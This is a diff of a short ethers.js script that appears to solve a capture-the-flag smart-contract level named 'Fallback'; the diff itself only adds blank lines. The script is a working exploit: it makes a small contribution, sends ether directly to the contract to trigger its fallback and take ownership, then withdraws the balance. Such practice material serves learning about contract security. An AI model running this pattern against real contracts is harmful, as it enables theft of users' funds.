@@ -7,11 +7,13 @@ async function main() {
   const fallback = Fallback.attach(
     "0x9A979defF1180d9124b8aADBDcB5e77cF8722FaD"
   );
+
   const currentOwner = await fallback.owner();
   console.log(`Current Owner is  ${currentOwner}`);
   await fallback.connect(owner).contribute({
     value: ethers.utils.parseEther("0.0001"),
   });
+
   console.log("Attacking");
   await owner.sendTransaction({
     to: fallback.address,
@@ -19,6 +21,7 @@ async function main() {
   });
   const NewOwner = await fallback.owner();
   console.log(`New Owner is  ${NewOwner}`);
+
   await fallback.withdraw();
 }
 
